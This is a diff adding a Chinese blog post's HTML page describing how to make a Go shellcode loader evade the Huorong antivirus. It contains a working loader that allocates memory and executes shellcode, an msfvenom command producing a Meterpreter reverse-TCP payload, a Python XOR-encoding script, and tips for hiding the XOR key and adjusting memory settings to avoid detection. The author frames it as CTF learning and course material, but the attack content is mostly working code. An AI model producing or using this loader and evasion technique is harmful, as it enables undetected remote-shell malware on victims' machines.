@@ -1,0 +1,937 @@
+<!DOCTYPE html>
+<html lang="en-us">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='Go语言ShellCode免杀火绒'><title>Go语言ShellCode免杀火绒</title>
+
+<link rel='canonical' href='https://id-none.github.io/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/'>
+
+<link rel="stylesheet" href="/scss/style.min.e6c6a8eb379099a52a1148e4f0a5152d4590bfbcd698edad53dbb030ed6b66d3.css"><meta property='og:title' content='Go语言ShellCode免杀火绒'>
+<meta property='og:description' content='Go语言ShellCode免杀火绒'>
+<meta property='og:url' content='https://id-none.github.io/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/'>
+<meta property='og:site_name' content='Boris&#39;s Blog'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='Anti-AntiVirus' /><meta property='article:tag' content='Go' /><meta property='article:tag' content='Huorong' /><meta property='article:published_time' content='2024-06-03T16:22:34&#43;08:00'/><meta property='article:modified_time' content='2024-06-03T16:22:34&#43;08:00'/><meta property='og:image' content='https://id-none.github.io/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603162742164.png' />
+<meta name="twitter:title" content="Go语言ShellCode免杀火绒">
+<meta name="twitter:description" content="Go语言ShellCode免杀火绒"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://id-none.github.io/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603162742164.png' />
+    <link rel="shortcut icon" href="/favicon.ico" />
+
+  
+
+<style>
+    :root {
+        --article-font-family: "Noto Serif SC", var(--base-font-family);
+    }
+</style>
+
+<script> 
+		(function () {
+		    const customFont = document.createElement('link');
+		    customFont.href = "https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@300;700&display=swap"; 
+		    customFont.type = "text/css";
+		    customFont.rel = "stylesheet";
+		
+		    document.head.appendChild(customFont);
+		}());
+</script>
+
+    </head>
+    <body class="
+    article-page
+">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex 
+    <!-- 
+        on-phone--column extended
+     -->
+    on-phone--column extended
+">
+    
+<div id="article-toolbar">
+    <a href="https://id-none.github.io/" class="back-home">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="15 6 9 12 15 18" />
+</svg>
+
+
+
+        <span>Back</span>
+    </a>
+</div>
+    <aside class="sidebar left-sidebar sticky">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header class="site-info">
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu2a97a991bc44026a56eb79af212d657a_18913_300x0_resize_box_3.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">🐱‍💻</span>
+                
+            </figure>
+            
+        
+        
+        <h1 class="site-name"><a href="/">Boris&#39;s Blog</a></h1>
+        <h2 class="site-description">Act decisively and pursue your desires.</h2></header>
+
+    <ol class="menu" id="main-menu">
+        
+        
+        
+
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/about/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>About</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/links/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>Friends</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>Archives</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+
+        
+            <li id="dark-mode-toggle">
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                <span>Dark Mode</span>
+            </li>
+        
+    </ol>
+</aside>
+
+<main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/">
+                <img src="/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603162742164_hu9cfd642fd07fce8fd66523927f7b4328_51356_800x0_resize_box_3.png"
+                        srcset="/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603162742164_hu9cfd642fd07fce8fd66523927f7b4328_51356_800x0_resize_box_3.png 800w, /2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603162742164_hu9cfd642fd07fce8fd66523927f7b4328_51356_1600x0_resize_box_3.png 1600w"
+                        width="800" 
+                        height="254" 
+                        loading="lazy"
+                        alt="Featured image of post Go语言ShellCode免杀火绒" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/technology/" >
+                Technology
+            </a>
+        
+    </header>
+    
+
+    <h2 class="article-title">
+        <a href="/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/">Go语言ShellCode免杀火绒</a>
+    </h2>
+
+    
+    <h3 class="article-subtitle">
+        Go语言ShellCode免杀火绒
+    </h3>
+    
+
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Jun 03, 2024</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-words">
+                    1142字
+                </time>
+            </div>
+        
+    </footer>
+    
+</div>
+</header>
+
+    <section class="article-content">
+    
+    
+    <h1 id="1--shellcode-加载器go">1.  Shellcode 加载器（go）</h1>
+<p>我们先看最后的免杀代码</p>
+<pre><code class="language-go">package main
+
+import (
+	&quot;fmt&quot;
+	&quot;os&quot;
+	&quot;syscall&quot;
+	&quot;unsafe&quot;
+)
+
+const (
+	MEM_COMMIT             = 0x1000
+	MEM_RESERVE            = 0x2000
+	PAGE_EXECUTE_READWRITE = 0x40
+)
+
+var (
+	kernel32      = syscall.NewLazyDLL(&quot;kernel32.dll&quot;)
+	ntdll         = syscall.NewLazyDLL(&quot;ntdll.dll&quot;)
+	VirtualAlloc  = kernel32.NewProc(&quot;VirtualAlloc&quot;)
+	RtlCopyMemory = ntdll.NewProc(&quot;RtlCopyMemory&quot;)
+	//shellcode_buf = []byte{
+	//}
+	shellcode_buf = []byte{
+	}
+)
+
+func check(e error) {
+	if e != nil {
+		if e.Error() != &quot;The operation completed successfully.&quot; { // 内存错误
+			fmt.Println(e.Error())
+			os.Exit(1)
+		}
+	}
+}
+
+func main() {
+	//// xor
+	homeDir, _ := os.UserHomeDir()
+	xor := homeDir[3] // U -&gt; 85
+	decimalValue := int(xor)
+	shellcode := xorEncrypt(shellcode_buf, decimalValue)
+	//shellcode := shellcode_buf
+
+	fmt.Println(shellcode)
+	// 申请内存
+	// MEM_COMMIT|MEM_RESERVE
+	addr, _, err := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT, PAGE_EXECUTE_READWRITE)
+	if addr == 0 {
+		check(err)
+	}
+	// 写入shellcode
+	_, _, err = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&amp;shellcode[0])), uintptr(len(shellcode)))
+	check(err)
+
+	// 执行shellcode
+	syscall.Syscall(addr, 0, 0, 0, 0)
+}
+
+func xorEncrypt(buf []byte, value int) []byte {
+	for i := 0; i &lt; len(buf); i++ {
+		buf[i] ^= byte(value)
+	}
+	return buf
+}
+
+// go build -ldflags=&quot;-H windowsgui -w -s&quot; shellcodeLoader.go
+
+</code></pre>
+<h1 id="2-shellcode-生成">2. shellcode 生成</h1>
+<p>对于shellcode的生成我们采用msf进行生成：</p>
+<pre><code class="language-bash">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=xxxx LPORT=xxxx -f c
+</code></pre>
+<p>对于生成的shellcode，我们如果不进行处理，对于火绒这类的杀毒软件来说，做简单的静态分析，如果坚持到0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xcc, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50···这些关键字节，肯定会报毒：Backdoor/W64.Meterpreter.f</p>
+<p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 314; 
+			flex-basis: 754px"
+	>
+	<a href="/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603163500472.png" data-size="761x242">
+		<img src="/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603163500472.png"
+			width="761"
+			height="242"
+			srcset="/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603163500472_hu9cfd642fd07fce8fd66523927f7b4328_51356_480x0_resize_box_3.png 480w, /2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603163500472_hu9cfd642fd07fce8fd66523927f7b4328_51356_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<h1 id="3可能的绕过方式">3.可能的绕过方式</h1>
+<p>一般来说，为了防止shellcode被检测到，我们通过对shellcode进行处理，如base64加密，亦或等等操作，也可以考虑github的sgn工具。</p>
+<p>本文我们主要采用亦或操作（xor）</p>
+<p>我们先将msf生成的shellcode进行亦或操作：</p>
+<pre><code class="language-python"># xor.py 
+shellcode = []
+
+# xor 85
+shellcode1 = ''.join(['\\x%02x' % i for i in shellcode])
+print(shellcode1)
+for i in range(len(shellcode)):
+    shellcode[i] ^= 85
+
+# 0x格式化输出
+shellcode = ''.join(['\\x%02x' % i for i in shellcode])
+print(shellcode)
+</code></pre>
+<p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 615; 
+			flex-basis: 1478px"
+	>
+	<a href="/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603164348537.png" data-size="2476x402">
+		<img src="/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603164348537.png"
+			width="2476"
+			height="402"
+			srcset="/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603164348537_hu68bb3f7e214e39998f19f09f7eab598b_73178_480x0_resize_box_3.png 480w, /2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603164348537_hu68bb3f7e214e39998f19f09f7eab598b_73178_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<p>再将shellcode进行替换，并且与目标值进行亦或，就可以获得正确的shellcode。</p>
+<p>但是当我们进行编译的时候，任然报毒。</p>
+<p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 314; 
+			flex-basis: 754px"
+	>
+	<a href="/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603163500472.png" data-size="761x242">
+		<img src="/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603163500472.png"
+			width="761"
+			height="242"
+			srcset="/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603163500472_hu9cfd642fd07fce8fd66523927f7b4328_51356_480x0_resize_box_3.png 480w, /2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603163500472_hu9cfd642fd07fce8fd66523927f7b4328_51356_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<pre><code class="language-go">
+shellcode := xorEncrypt(shellcode_buf, 85)
+
+func xorEncrypt(buf []byte, value int) []byte {
+	for i := 0; i &lt; len(buf); i++ {
+		buf[i] ^= byte(value)
+	}
+	return buf
+}
+</code></pre>
+<p>这是由于火绒在检测的时候如果能明确看到85，会尝试亦或来还原shellcode，base64同理。</p>
+<p>所以我们就尝试如果隐藏85，通过读取用户目录来获取。</p>
+<pre><code class="language-go">
+	homeDir, _ := os.UserHomeDir()
+	xor := homeDir[3] // U -&gt; 85
+	decimalValue := int(xor)
+</code></pre>
+<p>此时，shellcode是没有问题的，但是在进行编译的时候会遇到内存的报毒：</p>
+<p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 309; 
+			flex-basis: 741px"
+	>
+	<a href="/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603165148696.png" data-size="776x251">
+		<img src="/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603165148696.png"
+			width="776"
+			height="251"
+			srcset="/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603165148696_huc6139853c71ea2ae99ec210e13bdcc2d_52278_480x0_resize_box_3.png 480w, /2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603165148696_huc6139853c71ea2ae99ec210e13bdcc2d_52278_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<p>这个原因是我们在申请内存时，设置内存权限为MEM_COMMIT|MEM_RESERVE；</p>
+<p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 254; 
+			flex-basis: 611px"
+	>
+	<a href="/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603165231430.png" data-size="1100x432">
+		<img src="/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603165231430.png"
+			width="1100"
+			height="432"
+			srcset="/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603165231430_hu32dbec9d972f2d35da4af401bd4375f1_335259_480x0_resize_box_3.png 480w, /2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603165231430_hu32dbec9d972f2d35da4af401bd4375f1_335259_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 529; 
+			flex-basis: 1270px"
+	>
+	<a href="/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603165236028.png" data-size="1631x308">
+		<img src="/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603165236028.png"
+			width="1631"
+			height="308"
+			srcset="/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603165236028_hu1c25fe5c025c7d21bb1d2be40b9d98eb_173178_480x0_resize_box_3.png 480w, /2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603165236028_hu1c25fe5c025c7d21bb1d2be40b9d98eb_173178_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<p>我们将内存权限设置为MEM_COMMIT就可以了。</p>
+<h1 id="4-免杀效果">4. 免杀效果</h1>
+<p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 166; 
+			flex-basis: 398px"
+	>
+	<a href="/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603165452345.png" data-size="1023x616">
+		<img src="/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603165452345.png"
+			width="1023"
+			height="616"
+			srcset="/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603165452345_hu9b6babee500537cd031d39e44c5758e6_33020_480x0_resize_box_3.png 480w, /2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603165452345_hu9b6babee500537cd031d39e44c5758e6_33020_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<p>查看能否上线</p>
+<p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 162; 
+			flex-basis: 390px"
+	>
+	<a href="/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603165603224.png" data-size="1299x799">
+		<img src="/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603165603224.png"
+			width="1299"
+			height="799"
+			srcset="/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603165603224_hu8ffe3f08206ee9e5b4940159336c6d6c_76976_480x0_resize_box_3.png 480w, /2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603165603224_hu8ffe3f08206ee9e5b4940159336c6d6c_76976_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<h1 id="5-总结">5. 总结</h1>
+<p>这是第一次尝试免杀，之前一直在学习pwn和web安全，但是在前段时间的上海市大学生磐石行动的比赛中，发现内网中存在杀毒软件，且无法及时绕过，虽然通过文件包含读取到了flag，但是却阻止了我们进一步的渗透利用，最后也只获得了第十一名，与决赛遗憾错过。</p>
+<p>回来之后，反思了很多，觉得还是要对免杀进行一部分的学习，go语言的shellcode免杀通过微信推文看到的，决定挺有意思的，便在之后的学习中进行尝试，没想到就成功绕过了火绒（其他杀毒软件还没有尝试过），但是这也激起了我学习的热情。</p>
+<p>此外，最近也收到了实验室导师的任务，给本科生同学们准备渗透测试（CTF）的课程，也觉得免杀蛮重要的，顺便也一起给讲了。</p>
+<p><strong>学无止境，脚踏实地。</strong></p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/anti-antivirus/">Anti-AntiVirus</a>
+        
+            <a href="/tags/go/">Go</a>
+        
+            <a href="/tags/huorong/">Huorong</a>
+        
+    </section>
+
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    <aside class="related-contents--wrapper">
+    
+    
+        <h2 class="section-title">Related contents</h2>
+        <div class="related-contents">
+            <div class="flex article-list--tile">
+                
+                    
+<article class="has-image">
+    <a href="/2024/pwncollege-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">
+        
+        
+            <div class="article-image">
+                <img src="/2024/pwncollege-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/_hu243db3fa8c31b69b4cad675550d250f2_238751_28fed766b04416c4463c25c01e5d2fd8.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post PwnCollege 学习笔记"
+                        
+                        data-hash="md5-0G23Ij3gG7EDOLZUyQ2q6A==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">PwnCollege 学习笔记</h2>
+        </div>
+    </a>
+</article>
+                
+            </div>
+        </div>
+    
+</aside>
+
+     
+    
+
+    <footer class="site-footer">
+  
+
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+
+<script>
+(function(u, c) {
+  var d = document, t = 'script', o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+  o.src = u;
+  if (c) { o.addEventListener('load', function(e) { c(e); }); }
+  s.parentNode.insertBefore(o, s);
+})('//cdn.bootcss.com/pangu/3.3.0/pangu.min.js', function() {
+  pangu.spacingPage();
+});
+</script>
+
+    <section class="copyright">
+        &copy; 
+        
+        2024 Boris's Blog</a>·<i class="fas fa-bell"></i> <a id="days">0</a>Days<br>
+      共书写了3.1k字·共 3篇文章</br><span><p>
+    </section>
+    
+    <section class="powerby">
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.2.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a><br />
+         <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">© Licensed Under CC BY-NC-SA 4.0</a>
+    </section>
+
+<script>
+var s1 = '2024-05-17';
+s1 = new Date(s1.replace(/-/g, "/"));
+s2 = new Date();
+var days = s2.getTime() - s1.getTime();
+var number_of_days = parseInt(days / (1000 * 60 * 60 * 24));
+document.getElementById('days').innerHTML = number_of_days;
+</script>
+    
+</footer>
+
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css"integrity="sha256-c0uckgykQ9v5k&#43;IqViZOZKc47Jn7KQil4/MP3ySA3F8="crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css"integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE="crossorigin="anonymous"
+            >
+
+            </main>
+    
+    
+    
+    <aside class="sidebar right-sidebar sticky">
+        
+            <form action="/search/" class="search-form widget" >
+        <p>
+            <label>Search</label>
